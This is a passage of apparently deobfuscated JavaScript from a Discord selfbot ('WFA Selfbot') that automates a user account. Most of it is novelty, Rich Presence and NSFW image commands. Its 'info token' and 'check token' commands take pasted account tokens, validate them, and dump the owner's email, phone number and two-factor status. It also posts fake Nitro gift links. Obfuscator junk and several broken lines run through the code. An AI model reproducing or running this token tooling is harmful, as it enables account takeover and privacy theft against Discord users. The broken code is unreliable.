            if (bS.statusCode === 200) {
              new Promise((bW, bX) => {
                const bY = {
                  'fvuYX': 'mfa_enabled',
                  'CvWqp': 'phone',
                  'bukar': 'locale',
                  'rDSQS': 'public_flags',
                  'mCYSh': 'email',
                  'UmXis': 'verified',
                  'aLuoA': 'nsfw_allowed',
                  'uaNlq': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'PUaso': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'NlyPg': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'OQCXu': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'uekWP': '\nId: ',
                  'nkMbh': '\nEmail: ',
                  'GnVNu': '\nNuméro de telephone: ',
                  'vWZmb': '\nAvatar: ',
                  'SBJso': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'YTtRL': '\nCompte vérifié?: ',
                  'jborY': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'ALHQG': '\nFlags: ',
                  'dpEUx': '\nPublic Flags: ',
                  'MDPmi': function (bZ, c0) {
                    return bZ + c0;
                  },
                  'MSfGH': '```',
                  'VwkPW': '[COMMAND] info token command executed',
                  'DCjJa': '[COMMANDE] Commande thigh executé'
                };
                {
                  let bZ = 'https://discordapp.com/api/v6/users/@me';
                  const c0 = {};
                  c0.authorization = bN, request(bZ, {
                    'method': 'GET',
                    'headers': c0
                  }, function (c1, c2, c3) {
                    c3 = JSON.parse(c3);
                    var c4 = c3.id,
                        c5 = c3.username,
                        c6 = c3.avatar,
                        c7 = c3.discriminator,
                        c8 = c3.mfa_enabled,
                        c9 = c3.phone,
                        ca = c3.locale;
                    let cb = c3.public_flags,
                        cc = c3.flags,
                        cd = c3.email,
                        ce = c3.verified,
                        cf = c3.nsfw_allowed;
                    var cg = '';
                    cg += '\nUser: ' + c5 + '#' + c7, cg += '\nId: ' + c4, cg += '\nEmail: ' + cd;
                    cg += '\nNuméro de telephone: ' + c9, cg += '\nAvatar: ' + c6, cg += '\nLangue: ' + ca, cg += '\nA2f activé?: ' + c8, cg += '\nCompte vérifié?: ' + ce, cg += '\nNsfw activé?: ' + cf, cg += '\nFlags: ' + cc, cg += '\nPublic Flags: ' + cb, a4.edit('```' + cg + '```').then(console.log(consolecolor.instagram('[COMMAND] info token command executed')));
                  });
                }
              });
            } else a4.edit('**the token is not valid :x:**').catch(bX => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
          }
        });
      }

      if (a4.content.startsWith(prefix + 'check token')) {
        let bS = a6.splice(1).join(' '),
            bT = 'https://discordapp.com/api/v6/users/@me';
        const bU = {};
        bU.authorizaion = bS, request(bT, {
          'method': 'GET',
          'headers': bU
        }, function (bV, bW, bX) {
          const bY = {
            'xnOgV': 'All kick'
          };
          const bZ = bY;

          if (bW.statusCode === 200) {
            a4.edit('```diff\n + the token:' + bS + 'is 100% valid ✔```').catch(c1 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
          } else a4.edit('```diff\n- The token ' + bS + ' is not valid :x:```').catch(c1 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));

          console.log(consolecolor.instagram('[COMMAND] check token command executed'));
        });
      }

      if (a4.content.startsWith(prefix + 'lovecalc')) {
        let bV = ['5%', '10%', '15%', '20%', '25%', '30%', '35%', '40%', '45%', '50%', '55', '60%', '65%', '70%', '75%', '80%', '85%', '90%', '95%', '100%'];
        rdm = Math.floor(Math.random(), bV.length), laPersonne = a6.slice(0).join(' ') || 'WFA selfbot';
        const bW = laPersonne.split(' ').join('%2520'),
              bX = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=LoveCalc%2520%25E2%259D%25A4&description=relation%2520entre%2520' + bW + '%2520and%2520' + author + '%252C%2520relation%2520idim%25C3%25A9e%2520%25C3%25A0%2520' + bV[rdm])).catch(bY => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] lovecalc command executed'));
      }

      a4.content.startsWith(prefix + 'start typing') && (a4.delete(), console.log(consolecolor.instagram('[COMMAND] start typing command executed')), a4.channel.startTyping().catch(bZ => {}));

      if (a4.content.startsWith(prefix + '8ball')) {
        let bZ = a4.content.split(' ').splice(1).join(' ');
        var aj = ['yes', 'no...', 'maybe?', 'probably', 'I don\'t think so.', 'never', 'you can try...'];
        if (bZ[1] != null) a4.edit(bZ + '\nthe answer is: ' + aj[Math.floor(Math.random() * aj.length)]).catch(c0 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));else a4.edit('What\'s your question? :rolling_eyes: (try:' + prefix + ' 8ball [question])');
        console.log(consolecolor.instagram('[COMMAND] 8ball command executed'));
      }

      a4.content.startsWith(prefix + 'pp') && (a4.edit('8=:fist:==D'), a4.edit('8==:fist:=D'), a4.edit('8===:fist:D '), a4.edit('8==:fist:=D'), a4.edit('8=:fist:==D '), a4.edit('8:fist:===D'), a4.edit('8=:fist:==D '), a4.edit('8==:fist:=D'), a4.edit('8===:fist:D'), a4.edit('8==:fist:=D:sweat_drops:'), a4.edit('8===:fist:D:sweat_drops:'), console.log(consolecolor.instagram('[COMMAND] pp command executed')));

      if (a4.content.startsWith(prefix + 'say')) {
        ;
        const c2 = ['ee5d5d', 'ee5d9c', 'ee5dcf', 'b45dee', '5d62ee', '5d95ee', '5dddee', '5deebe', '5dee7a', '7dee5d', 'c0ee5d', 'eecf5d', 'ee9f5d', 'ee5d5d'];
        if (!a6) throw 'You must have something to say!';
        let c3 = a6.splice(1).join(' ').split(' ').join('%2520') || 'WFA selfbot';

        for (pas = 0; pas < 10; pas++) {
          a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=Command%2520Say&description=' + c3 + '&color=' + c2)).catch(c4 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }

        console.log(consolecolor.instagram('[COMMAND] say command executed'));
      }

      if (a4.content.startsWith(prefix + 'fight')) {
        if (!a7) return a8.edit(':x: **No users mentioned**');
        const c4 = a7.username.split(' ').join('%2520'),
              c5 = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c4 + '%2520VS%2520' + c5 + '&image=https%253A%252F%252Fwww.photofunky.net%252Foutput%252Fimage%252Fe%252F8%252F8%252Fa%252Fe88abf%252Fphotofunky.gif')).catch(c6 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] fight command executed'));
      }

      if (a4.content.startsWith(prefix + 'boom')) {
        if (!a7) return a8.edit(':x: **No users mentioned**');
        const c7 = a7.username.split(' ').join('%2520'),
              c8 = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + c7 + '%2520is%2520blown%2520blown%2520up%2520by%2520' + c8 + '%25F0%259F%2592%25A3%25F0%259F%2592%25A5&image=https%252Fmedia.discordapp.net%252Fattachments%252F648223633185177612%252F650715035592687647%252Fimage0.gif')).catch(c9 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] boom command executed'));
      }

      if (a4.content == prefix + 'shutdown') {
        console.log(consolecolor.atlas('[EVENT] WFA Selfbot stoped')), a8.delete(), setTimeout(() => {
          process.exit(1);
        }, 500);
      }

      if (a4.content == prefix + 'laugh') {
        const ca = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + ca + '%2520laugh%2520%25F0%259F%2598%2582&image=') + C[Math.floor(Math.random() * C.length)]).catch(cb => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] laugh command executed'));
      }

      if (a4.content.startsWith(prefix + 'kiss')) {
        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        const cb = a7.username.split(' ').join('%2520'),
              cc = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + cb + '%2520kiss%2520' + cc + '%2520%25E2%259D%25A4&image=') + D[Math.floor(Math.random() * D.length)]).catch(ce => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] kiss command executed'));
      }

      if (a4.content.startsWith(prefix + 'veski')) {
        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        const ce = a7.username.split(' ').join('%2520'),
              cf = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + ce + '%2520veski%2520&image=') + F[Math.floor(Math.random() * F.length)]).catch(cg => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] veski command executed'));
      }

      if (a4.content.startsWith(prefix + 'load')) {
        a4.delete();
        var ak = '.',
            al = '█';
        a4.channel.send('```[' + ak.repeat(50) + ']```').then(cg => {
          for (i = 0; i <= 50; i++) {
            cg.edit('```[' + al.repeat(i) + ak.repeat(50 - i) + ']  -  ' + i * 100 / 50 + '%\nloading..```');
          }

          cg.edit('`Data obtained!`').catch(ci => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
          console.log(consolecolor.instagram('[COMMAND] load command executed'));
        });
      }

      if (a4.content.startsWith(prefix + 'punch')) {
        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        const cg = a7.username.split(' ').join('%2520'),
              ch = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + ch + '%2520punch%2520' + cg + '%2520%25F0%259F%2591%258A&image=') + G[Math.floor(Math.random() * G.length)]).catch(ci => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] punch command executed'));
      }

      if (a4.content.startsWith(prefix + 'hug')) {
        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        const cj = a7.username.split(' ').join('%2520'),
              ck = client.user.username.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=' + ck + '%2520hugs%2520' + cj + '&image=') + E[Math.floor(Math.random() * E.length)]).catch(cm => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] hug command executed'));
      }

      a4.content === prefix + 'nitro' && (a4.edit('https://discord.gift/' + nitrocode(16, '0aA')).catch(cm => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] nitro command executed')));

      if (a8.content.startsWith(prefix + 'reverse')) {
        let cm = a6.splice(1).join(' ');
        if (!cm) a4.edit(':x: **no text defined**');

        function cn(cp) {
          return cp.split('').reverse().join('');
        }

        let co = cn(cm);
        if (a6[0] = co) co = a6.splice(1).join(' ');
        a8.edit('' + co).catch(cp => {}), console.log(consolecolor.instagram('[COMMAND] reverse command executed'));
      }

      if (a4.content.startsWith(prefix + 'kick')) {
        let cp = a4.guild;

        if (!cp) {
          a4.edit(':x: **Please run this command on a server!**');
          return;
        }

        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        a7.kick().then(cs => {
          a4.edit(':wave:', cs.displayName + ' was kicked :point_right: ');
        }).catch(() => {
          a4.delete(), console.log('[ERREUR]'.red + ' I can\'t kick this person'.green);
        }), console.log(consolecolor.instagram('[COMMAND] kick command executed'));
      }

      if (a4.content.startsWith(prefix + 'ban')) {
        let cs = a4.guild;

        if (!cs) {
          a4.edit(':x: **Please run this command on a server!**');
          return;
        }

        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        a7.ban().then(cv => {
          const cw = {
            'YYqPp': 'Rpc',
            'CFfbs': 'Fortnite',
            'WFflw': 'PLAYING',
            'PpQxy': '603405368940429315',
            'zeDAm': 'WFA Selfbot',
            'CNYjS': 'WFA-Selfbot E',
            'aWHIJ': 'now',
            'IZlwh': function (cx) {
              return cx();
            },
            'LFPBF': '[COMMAND] fortnite command executed',
            'eyKth': function (cx, cy) {
              return cx + cy;
            },
            'TPPsO': ':white_check_mark: **You play ',
            'hCYAG': ' on fortnite**'
          };
          a4.edit(':wave: ' + cv.displayName + 'has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right:');
        }).catch(() => {
          a4.delete();
          console.log('[ERREUR]'.red + ' I can\'t ban this person'.green);
        }), console.log(consolecolor.instagram('[COMMAND] ban command executed'));
      }

      if (a4.content.startsWith(prefix + 'role info' || prefix + 'ri')) {
        let cv = a4.guild,
            cw = a4.mentions.roles.first();
        if (!cv) return a8.edit(':x: **Please run this command on a server**');
        if (!cw) return a4.delete().then(console.log('[' + 'ERROR'.red + ']' + 'a role name is required'.green));
        const cx = {
          'false': 'Non',
          'true': 'Oui'
        };
        const cy = cx;
        console.log(consolecolor.instagram('[COMMAND] role info command executed')), a4.edit('```\nRole: <@&' + cw.id + '>\n\nID of the role: ' + cw.id + '\n\nColor: ' + cw.hexColor + '\n\nNumber of members in this role: ' + cw.members.size + '\n\nposition: ' + cw.position + '\n\nmentionnable: ' + cy[cw.mentionable] + '```').catch(cz => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
      }

      if (a4.content.startsWith(prefix + 'add emote')) {
        if (a4.channel.type === 'dm') {
          a4.edit(':x: **Command not executable in dm**');
          return;
        }

        let cz = a6.splice(2).join(' '),
            cA = Discord.Util.parseEmoji(cz);

        if (!a6) {
          a4.edit(':x: **Please choose an emote.**');
          return;
        }

        if (!cA) {
          a4.edit(':x: **Invalid emote try this** ' + prefix + 'add emote (emote) <name>');
          return;
        }

        if (!a4.member.hasPermission('MANAGE_EMOJIS')) {
          a4.edit(':x: **You don\'t have "Manage emojis" permissions on this server**');
          return;
        }

        if (cA.id) {
          const cB = 'https://cdn.discordapp.com/emojis/' + cA.id + '.' + cA.animated ? 'gif' : 'png';
          let cC = a4.content.split(' ').splice(3) || cA.name;
          a4.guild.createEmoji(cB, cC), a4.edit(':white_check_mark: **Emote added to the server.**'), console.log(consolecolor.instagram('[COMMAND] add emote command executed'));
        } else a4.edit(':x: **Please choose a valid emote!**');
      }

      if (a4.content === prefix + 'emote') {
        if (a4.channel.type === 'dm') {
          a4.edit(':x: **Command not executable in dm**');
          return;
        }

        let cD = '',
            cE = '',
            cF = 0,
            cG = 0,
            cH = 0;

        function cI(cJ) {
          return client.emogjis.get(cJ).toString();
        }

        a4.guild.emogis.forEach(cJ => {
          cH++;
          if (cJ.animated) cG++, cE += cI(cJ.id);
        }), a4.edit('```\nServer: **' + a4.guild.name + '**\n\nAnimated Emojis: [' + cG + ']\n' + cE || 'None\n\nSimple Emotes:\n[' + cF + '] \n' + cD || 'None\n\nTotal emote: [' + cH || 'None]\n' + cD + ' ' + cE + '```'), console.log(consolecolor.instagram('[COMMAND] emote command executed'));
      }

      if (a4.content.startsWith(prefix + 'remove emote')) {
        if (a4.channel.type === 'dm') {
          a4.edit(':x: **Command not executable in dm**');
          return;
        }

        if (!a4.member.hasPermission('MANAGE_EMOJIS')) return a4.edit(':x: **You do not have "Manage emojis" permissions on this server**');
        const cJ = a6.splice(2).join(' ');
        if (!cJ) return a4.edit(':x: **Please choose an emote.**');
        let cK = Discord.Util.parseEmoji(cJ);
        if (!a4.guild.emojis.forEach(cL => {
          const cM = {
            'rRJyj': function (cN, cO) {
              return cN === cO;
            }
          };
          {
            if (!cL.i === cK.id) return a4.channel.send(':x: **This emote is not on the server**.');
          }
        })) return a4.edit(':white_check_mark: **Emote correctement supprimée du serveur.**');

        if (cK.id) {
          const cL = 'https://cdn.discordapp.com/emojis/' + cK.id + '.' + cK.animated ? 'gif' : 'png';
          a4.guild.emojis.get(cK.id).delete();
        } else {
          let cM = parse(cJ, {
            'assetType': 'png'
          });
          if (!cM[0]) return a4.edit(':x: **Please choose a valid emote**!');
          a4.edit(':x: **You can\'t delete emotes by default**!');
        }

        console.log(consolecolor.instagram('[COMMAND] remove emote command executed'));
      }

      if (a4.content.startsWith(prefix + 'ass')) {
        if (nsfw === 'on') {
          const cN = {
            'type': 'ass'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cN).end((cO, cP) => {
            a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + cP.body.message + '\n').catch(cQ => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
            console.log(consolecolor.instagram('[COMMAND] ass command executed'));
          });
        } else a4.delete().catch(cP => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green);
      }

      if (a4.content.startsWith(prefix + '4k')) {
        if (nsfw === 'on') {
          const cQ = {
            'type': '4k'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cQ).end((cR, cS) => {
            const cT = {
              'LRRoU': 'retry-after'
            };
            const cU = cT;
            a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + cS.body.message + '\n').catch(cW => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] 4k command executed'));
          });
        } else a4.delete().catch(cR => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green);

        ;
      }

      if (a4.content.startsWith(prefix + 'nsfw-gif')) {
        if (nsfw === 'on') {
          const cR = {
            'type': 'pgif'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cR).end((cS, cT) => {
            const cU = {
              'FYfVl': 'username',
              'HLQfr': 'locale',
              'wWYRL': 'public_flags',
              'aThHQ': 'flags',
              'GOTVf': 'email',
              'iHmdH': 'verified',
              'drOLd': 'nsfw_allowed',
              'MxsKO': function (cV, cW) {
                return cV + cW;
              },
              'OqDGn': '\nUser: ',
              'iChDH': function (cV, cW) {
                return cV + cW;
              },
              'npPja': '\nId: ',
              'AGaJj': function (cV, cW) {
                return cV + cW;
              },
              'rEaga': '\nEmail: ',
              'EAfsH': '\nNuméro de telephone: ',
              'XUFRz': '\nAvatar: ',
              'YUqwP': function (cV, cW) {
                return cV + cW;
              },
              'SyNwR': '\nLangue: ',
              'Crawv': function (cV, cW) {
                return cV + cW;
              },
              'PnYJl': '\nA2f activé?: ',
              'JdJhI': function (cV, cW) {
                return cV + cW;
              },
              'IPtlF': '\nCompte vérifié?: ',
              'QoVtO': '\nNsfw activé?: ',
              'vDmFz': '\nFlags: ',
              'XDLwo': function (cV, cW) {
                return cV + cW;
              },
              'ZLEvQ': '\nPublic Flags: ',
              'pudOe': function (cV, cW) {
                return cV + cW;
              },
              'HHviQ': '```'
            };
            a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + cT.body.message + '\n').catch(cW => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] nsfw gif command executed'));
          });
        } else {
          a4.delete().catch(cT => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green);
        }
      }

      if (a4.content.startsWith(prefix + 'hentai')) {
        nsfw === 'on' ? superagent.get('https://nekobot.xyz/api/image').query({
          'type': 'hentai_anal'
        }).end((cU, cV) => {
          a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + cV.body.message + '\n').catch(cW => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
          console.log(consolecolor.instagram('[COMMAND] hentai command executed'));
        }) : (a4.delete().catch(cU => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green));
      }

      if (a4.content.startsWith(prefix + 'pussy')) {
        if (nsfw === 'on') {
          const cW = {
            'type': 'pussy'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cW).end((cX, cY) => {
            a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + cY.body.message + '\n').catch(cZ => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] pussy command executed'));
          });
        } else {
          a4.delete().catch(cX => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green);
        }
      }

      if (a4.content.startsWith(prefix + 'thigh')) {
        if (nsfw === 'on') {
          const cY = {
            'type': 'thigh'
          };
          superagent.get('https://nekobot.xyz/api/image').query(cY).end((cZ, d0) => {
            a8.edit(ghost + ('https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + d0.body.message)).catch(d2 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] thigh command executed'));
          });
        } else a4.delete().catch(cZ => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green);
      }

      a4.content.startsWith(prefix + 'anal') && (nsfw === 'on' ? superagent.get('https://nekobot.xyz/api/image').query({
        'type': 'anal'
      }).end((cZ, d0) => {
        a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=' + d0.body.message + '\n').catch(d2 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] anal command executed'));
      }) : (a4.delete().catch(cZ => {}), console.log('[NSFW]'.red + ' NSFW commands are disabled'.green)));

      if (a4.content.startsWith(prefix + 'spotify')) {
        const cZ = a4.content.split(' ').slice(1).join(' ') || h;
        let d0 = rpcGenerator.createSpotifyRpc(client).setAssetsLargeImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setAssetsSmallImage('spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e').setDetails(cZ).setState(client.user.username).setStartTimestamp(Date.now()).setEndTimestamp(Date.now() + 86400000);
        client.user.setPresence(d0.toDiscord()).then(a4.edit(':white_check_mark: **You listen ' + cZ + ' on spotify**')).catch(console.error), console.log(consolecolor.instagram('[COMMAND] spotify command executed'));
      }

      a4.content.startsWith(prefix + 'reset') && (clearInterval(), client.user.setActivity(null, {}), a4.edit(':information_source:  Votre statut a été réinitialisé ! :information_source:').catch(d1 => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] reset command executed')));

      if (a4.content.startsWith(prefix + 'gucci')) {
        let d1 = a6.splice(1).join(' ') || h;
        rpcGenerator.getRpcImages('603405368940429315', 'gucci').then(d2 => {
          const d3 = {
            'gNHFq': 'Gucci',
            'tdpJA': 'https://www.twitch.tv/OGAGAL_risitas',
            'oWIsE': 'WATCHING',
            'WGpgU': '603405368940429315',
            'UxxNQ': function (d4) {
              return d4();
            },
            'yrvIm': '[COMMAND] gucci command executed',
            'InFkU': function (d4, d5) {
              return d4 + d5;
            },
            'lzSIG': ':white_check_mark: **You watch ',
            'BORHA': ' on Gucci**'
          };
          rpcGenerator.getRpcImages('603405368940429315', 'gucci0').then(d4 => {
            let d5 = new rpcGenerator.Rpc().setName('Gucci').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Gucci').setAssetsLargeImage(d2.id).setAssetsSmallImage(d4.id).setAssetsLargeText(client.user.username).setState(d1).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(d5.toDiscord()).catch(d6 => {}), console.log(consolecolor.instagram('[COMMAND] gucci command executed')), a4.edit(':white_check_mark: **You watch ' + d1 + ' on Gucci**');
          });
        });
      }

      if (a4.content.startsWith(prefix + 'lacoste')) {
        let d2 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'lacoste').then(d3 => {
          const d4 = {
            'RsPsa': function (d5, d6) {
              return d5 === d6;
            },
            'iNRXC': function (d5, d6) {
              return d5 + d6;
            },
            'hvaYl': function (d5, d6) {
              return d5 + d6;
            },
            'XCLkR': ' is not valid :x:```',
            'XAJAy': 'https://discordapp.com/api/v6/users/@me',
            'CzEkl': 'GET'
          };
          {
            let d6 = new rpcGenerator.Rpc().setName('Lacoste').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Lacoste').setAssetsLargeImage(d3.id).setAssetsLargeText(client.user.username).setState(d2).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(d6.toDiscord()).catch(d7 => {}), console.log(consolecolor.instagram('[COMMAND] lacoste command executed')), a4.edit(':white_check_mark: **You watch ' + d2 + ' on lacoste**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'nike')) {
        let d4 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'nike').then(d5 => {
          let d6 = new rpcGenerator.Rpc().setName('Nike').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Nike').setAssetsLargeImage(d5.id).setAssetsLargeText(client.user.username).setState(d4).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          clien.user.setPresence(d6.toDiscord()).catch(d7 => {});
          console.log(consolecolor.instagram('[COMMAND] nike command executed')), a4.edit(':white_check_mark: **You watch ' + d4 + ' on Nike**');
        });
      }

      if (a4.content.startsWith(prefix + 'google')) {
        let d5 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'google').then(d6 => {
          let d7 = new rpcGenerator.Rpc().setName('Google').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Google').setAssetsLargeImage(d6.id).setAssetsLargeText(client.user.username).setState(d5).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(d7.toDiscord()).catch(d8 => {});
          console.log(consolecolor.instagram('[COMMAND] google command executed')), a4.edit(':white_check_mark: **You watch ' + d5 + ' on google**');
        });
      }

      if (a4.content.startsWith(prefix + 'skype')) {
        let d6 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'skype').then(d7 => {
          let d8 = new rpcGenerator.Rpc().setName('Skype').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Skype').setAssetsLargeImage(d7.id).setAssetsLargeText(client.user.username).setState(d6).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(d8.toDiscord()).catch(d9 => {}), console.log(consolecolor.instagram('[COMMAND] skype command executed'));
          a4.edit(':white_check_mark: **You watch ' + d6 + ' on Skype**');
        });
      }

      if (a4.content.startsWith(prefix + 'snapchat')) {
        let d7 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'snapchat').then(d8 => {
          const d9 = {
            'xOPDR': '▓▓░░░░░░░░ 20%'
          };
          const da = d9;
          {
            let dc = new rpcGenerator.Rpc().setName('Snapchat').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Snapchat').setAssetsLargeImage(d8.id).setAssetsLargeText(client.user.username).setState(d7).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(dc.toDiscord()).catch(dd => {}), console.log(consolecolor.instagram('[COMMAND] snapchat command executed')), a4.edit(':white_check_mark: **You watch ' + d7 + ' on Snapchat**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'facebook')) {
        let d8 = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'facebook').then(d9 => {
          let dc = new rpcGenerator.Rpc().setName('Facebook').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Skype').setAssetsLargeImage(d9.id).setAssetsLargeText(client.user.username).setState(d8).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(dc.toDiscord()).catch(dd => {}), console.log(consolecolor.instagram('[COMMAND] facebook command executed')), a4.edit(':white_check_mark: **You watch ' + d8 + ' on Facebook**');
        });
      }

      if (a4.content.startsWith(prefix + 'tiktok')) {
        let da = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImage('603405368940429315', 'tiktok').then(dc => {
          const dd = {
            'RNZSr': '[EVENT] WFA Selfbot stoped',
            'mCUWR': function (de, df, dg) {
              return de(df, dg);
            }
          };
          {
            let de = new rpcGenerator.Rpc().setName('Tiktok').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Tiktok').setAssetsLargeImage(dc.id).setAssetsLargeText(client.user.username).setState(da).setStartTimestamp(Date.now()).setParty({
              'id': uuid()
            });
            client.user.setPresence(de.toDiscord()).catch(df => {}), console.log(consolecolor.instagram('[COMMAND] tiktok command executed')), a4.edit(':white_check_mark: **You watch ' + da + ' on Tiktok**');
          }
        });
      }

      if (a4.content.startsWith(prefix + 'twitter')) {
        let dc = a6.splice(1).join(' ') || 'WFA-Selfbot';
        rpcGenerator.getRpcImages('603405368940429315', 'twitter').then(dd => {
          let de = new rpcGenerator.Rpc().setName('Twitter').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('WATCHING').setApplicationId('603405368940429315').setDetails('Twitter').setAssetsLargeImage(dd.id).setAssetsLargeText(client.user.username).setState(dc).setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(de.toDiscord()).catch(df => {});
          console.log(consolecolor.instagram('[COMMAND] twitter command executed')), a4.edit(':white_check_mark: **You watch ' + dc + ' on Twitter**');
        });
      }

      if (a4.content.startsWith(prefix + 'instagram')) {
        let dd = a6.splice(1).join(' ') || 'WFA-Selfbot';
